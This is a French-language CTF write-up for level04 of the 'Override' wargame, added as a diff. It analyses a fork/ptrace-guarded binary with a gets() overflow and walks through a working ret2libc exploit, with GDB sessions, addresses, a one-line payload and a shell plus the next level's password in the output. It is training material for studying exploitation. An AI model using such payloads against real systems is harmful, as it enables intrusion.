@@ -1,0 +1,351 @@
+# 📘 Override – Level04
+
+## 📝 Description
+
+Ce niveau du projet **Override** combine plusieurs concepts avancés : **fork()**, **ptrace()**, et **buffer overflow**. Le programme crée un processus enfant qui accepte du shellcode, mais un processus parent surveille les syscalls de l'enfant et le tue s'il détecte un appel à `execve()`. 
+
+L'objectif est d'exploiter le buffer overflow pour obtenir un shell **sans déclencher** la détection de `execve()` par le parent.
+
+---
+
+## 🔍 Analyse du binaire
+
+### Code désassemblé (simplifié)
+
+```c
+undefined4 main(void)
+{
+  int local_14;
+  char local_a0[128];
+  uint local_a4;
+  long local_18;
+  
+  local_14 = fork();  // Crée un processus enfant
+  
+  if (local_14 == 0) {
+    // ===== PROCESSUS ENFANT =====
+    prctl(1, 1);                    // PR_SET_PDEATHSIG : meurt si parent meurt
+    ptrace(PTRACE_TRACEME, 0, 0, 0); // Se laisse tracer par le parent
+    
+    puts("Give me some shellcode, k");
+    gets(local_a0);  // ⚠️ BUFFER OVERFLOW !
+    
+  } else {
+    // ===== PROCESSUS PARENT =====
+    do {
+      wait(&local_a4);  // Attend que l'enfant fasse un syscall
+      
+      // Vérifie si l'enfant est terminé
+      if ((local_a4 & 0x7f) == 0) {
+        puts("child is exiting...");
+        return 0;
+      }
+      
+      // Récupère le numéro du syscall
+      local_18 = ptrace(PTRACE_PEEKUSER, local_14, 0x2c, 0);
+      
+      // Si syscall == 0xb (execve) → TUE l'enfant !
+      if (local_18 == 0xb) {
+        puts("no exec() for you");
+        kill(local_14, 9);  // ← SIGKILL
+        break;
+      }
+      
+    } while (true);
+  }
+  
+  return 0;
+}
+```
+
+### ✔ Points clés
+
+1. **fork()** : Crée deux processus distincts (parent et enfant)
+2. **ptrace()** : Le parent surveille **tous les syscalls** de l'enfant
+3. **Buffer overflow** : `gets(local_a0)` lit sans limite dans un buffer de 128 bytes
+4. **Protection anti-execve** : Si l'enfant appelle `execve()` (syscall 0xb), il est tué
+
+### 🚨 Vulnérabilités
+
+| Vulnérabilité     | Description                                   | Impact               |
+| ----------------- | --------------------------------------------- | -------------------- |
+| Buffer overflow   | `gets(local_a0)` sans limite de taille        | Contrôle de EIP      |
+| Détection execve  | Syscall 0xb détecté et bloqué                 | Shellcode classique KO |
+
+---
+
+## 🎯 Stratégie d'exploitation
+
+### ❌ Ce qui ne marche PAS
+
+**Shellcode classique avec execve :**
+
+Le parent détecte `0xb` et tue l'enfant avant l'exécution.
+
+### ✅ Solution : Return-to-libc (ret2libc)
+
+Au lieu d'exécuter un shellcode qui fait `execve()`, on utilise le **buffer overflow** pour :
+
+1. Rediriger l'exécution vers la fonction **`system()`** de la libc
+2. Passer `"/bin/sh"` comme argument à `system()`
+
+**Pourquoi ça marche ?**
+- `system()` ne fait **pas directement** le syscall `execve()` au niveau où ptrace le détecte
+- `system()` utilise d'autres mécanismes internes (fork + exec dans un sous-processus)
+- Le parent ne voit pas le `execve()` fait par le sous-processus de `system()`
+
+---
+
+## 🔧 Méthodologie d'exploitation
+
+### Étape 1 : Trouver l'offset du buffer overflow
+
+#### Dans GDB avec suivi de l'enfant
+
+```bash
+gdb ./level04
+
+# IMPORTANT : Suit le processus enfant (où se trouve le buffer overflow)
+(gdb) set follow-fork-mode child
+
+(gdb) run
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1866]
+0x41326641 in ?? ()
+```
+
+**Offset trouvé : 156 bytes**
+
+### Étape 2 : Localiser les adresses nécessaires
+
+#### Dans GDB
+
+```bash
+gdb ./level04
+
+(gdb) set follow-fork-mode child
+(gdb) break main
+(gdb) run
+
+# 1. Adresse de system()
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+# 2. Trouver la zone mémoire de libc
+(gdb) info proc mappings
+Start Addr   End Addr       Size     Offset objfile
+0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+
+# 3. Chercher la chaîne "/bin/sh" dans libc
+(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
+0xf7f897ec
+1 pattern found.
+```
+
+### Étape 3 : Comprendre le layout de la stack
+
+```
+Stack avant overflow:
++------------------+
+| local_a0[128]    | ← Buffer où on écrit
+| ...              |
+| saved EBP        | (4 bytes)
+| return address   | ← On veut contrôler ça
++------------------+
+
+Stack après overflow (ret2libc):
++------------------------+
+| 'A' * 156              | ← Padding jusqu'à EIP
+| [system address]       | ← EIP → 0xf7e6aed0
+| [fake return]          | ← Return de system (ignoré)
+| ["/bin/sh" address]    | ← Argument → 0xf7f897ec
++------------------------+
+```
+
+### Étape 4 : Construction du payload
+
+#### Structure ret2libc
+
+```
+Quand on fait return vers system() :
+
+1. EIP saute à system()
+2. system() s'exécute et cherche ses arguments sur la stack
+3. Convention d'appel x86 :
+   - Return address : esp+0  (ignoré par nous)
+   - 1er argument  : esp+4   ← On met "/bin/sh" ici
+4. system("/bin/sh") s'exécute !
+```
+
+---
+
+## 🚀 Exploitation
+
+### Commande d'exploitation
+
+```bash
+(python -c "import struct; print 'A'*156 + struct.pack('<I', 0xf7e6aed0) + 'BBBB' + struct.pack('<I', 0xf7f897ec)"; cat) | ./level04
+```
+
+**Note** : Le `cat` à la fin garde stdin ouvert pour interagir avec le shell.
+
+### Résultat
+
+```bash
+level04@OverRide:~$ (python -c "import struct; print 'A'*156 + struct.pack('<I', 0xf7e6aed0) + 'BBBB' + struct.pack('<I', 0xf7f897ec)"; cat) | ./level04
+Give me some shellcode, k
+whoami
+level05
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+```
+
+---
+
+## 🔐 Détails techniques
+
+### Pourquoi `set follow-fork-mode child` ?
+
+Quand un programme fait `fork()`, GDB doit choisir quel processus suivre :
+
+| Mode                        | Comportement                                  |
+| --------------------------- | --------------------------------------------- |
+| `follow-fork-mode parent`   | Suit le parent (défaut)                       |
+| `follow-fork-mode child`    | Suit l'enfant (où se trouve notre overflow !) |
+
+**Sans cette option**, GDB reste sur le parent et tu ne vois pas le crash de l'enfant.
+
+```bash
+# Mauvais (défaut)
+(gdb) run
+child is exiting...  # ← On ne voit rien !
+
+# Bon
+(gdb) set follow-fork-mode child
+(gdb) run
+Program received signal SIGSEGV  # ← On voit le crash !
+```
+
+### Architecture ret2libc expliquée
+
+```
+1. Buffer overflow écrase EIP
+   ┌─────────────┐
+   │  Padding    │
+   │  'A' * 156  │
+   ├─────────────┤
+   │ system_addr │ ← EIP
+   ├─────────────┤
+   │   "BBBB"    │ ← Fake return
+   ├─────────────┤
+   │ binsh_addr  │ ← Argument
+   └─────────────┘
+
+2. Exécution
+   - return lit EIP et saute à system()
+   - ESP pointe sur "BBBB" (fake return)
+   - ESP+4 pointe sur binsh_addr
+
+3. Convention d'appel x86
+   call system(argument)
+   └─> argument est à ESP+4 après le call
+   
+4. system() lit [ESP+4] et trouve "/bin/sh"
+   system("/bin/sh") → Lance le shell !
+```
+
+### Pourquoi ptrace ne détecte pas system() ?
+
+```
+Shellcode classique :
+┌─────────────┐
+│ mov eax, 0xb│ ← Prépare execve
+│ int 0x80    │ ← ptrace DÉTECTE ici !
+└─────────────┘
+
+system() :
+┌──────────────────────┐
+│ fork()               │ ← Crée un sous-processus
+│  └─ enfant fait exec │ ← ptrace ne voit pas ce niveau
+│ waitpid()            │
+└──────────────────────┘
+```
+
+Le parent ptrace surveille l'enfant direct, pas les sous-processus créés par `system()`.
+
+### Little-endian
+
+Les adresses doivent être écrites en **little-endian** (ordre inversé des octets) :
+
+```
+Adresse : 0xf7e6aed0
+Big-endian    : \xf7\xe6\xae\xd0
+Little-endian : \xd0\xae\xe6\xf7  ← Correct pour x86 !
+
+struct.pack("<I", 0xf7e6aed0) → "\xd0\xae\xe6\xf7"
+                 ^
+                 < = little-endian
+```
+
+---
+
+
+## ✅ Résumé
+
+| Élément                | Valeur                                           |
+| ---------------------- | ------------------------------------------------ |
+| Vulnérabilité          | Buffer overflow dans `gets(local_a0)`            |
+| Protection             | ptrace détecte et bloque execve (syscall 0xb)    |
+| Technique              | Return-to-libc (ret2libc)                        |
+| Offset jusqu'à EIP     | 156 bytes                                        |
+| Adresse de system()    | `0xf7e6aed0`                                     |
+| Adresse de "/bin/sh"   | `0xf7f897ec`                                     |
+| Structure du payload   | padding + system + fake_ret + "/bin/sh"         |
+| Bypass ptrace          | system() n'est pas directement détecté           |
+| Gain                   | Shell en tant que *level05*                      |
+| Password level05       | `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`       |
+
+---
+
+## 🎓 Concepts clés appris
+
+### 1. Fork et ptrace
+
+- **fork()** crée un clone du processus
+- **ptrace()** permet à un processus de surveiller un autre
+- Utilisé par les debuggers (GDB) et pour la protection anti-debug
+
+### 2. Return-to-libc
+
+- Alternative au shellcode quand l'exécution de code est bloquée
+- Réutilise des fonctions existantes en mémoire
+- Contourne les protections DEP/NX (Data Execution Prevention)
+
+### 3. Convention d'appel x86
+
+```c
+// En C
+system("/bin/sh");
+
+// Sur la stack après call
+[return_address]
+[argument1]      ← ESP+4
+```
+
+### 4. Syscalls et détection
+
+- Chaque appel système a un numéro unique
+- `execve()` = syscall 11 (0xb)
+- ptrace peut intercepter et bloquer des syscalls spécifiques
+
+---
+
+## 📚 Références
+
+- [Return-to-libc attacks](https://en.wikipedia.org/wiki/Return-to-libc_attack)
+- [ptrace(2) man page](https://man7.org/linux/man-pages/man2/ptrace.2.html)
+- [Linux syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)
+- [x86 calling conventions](https://en.wikipedia.org/wiki/X86_calling_conventio
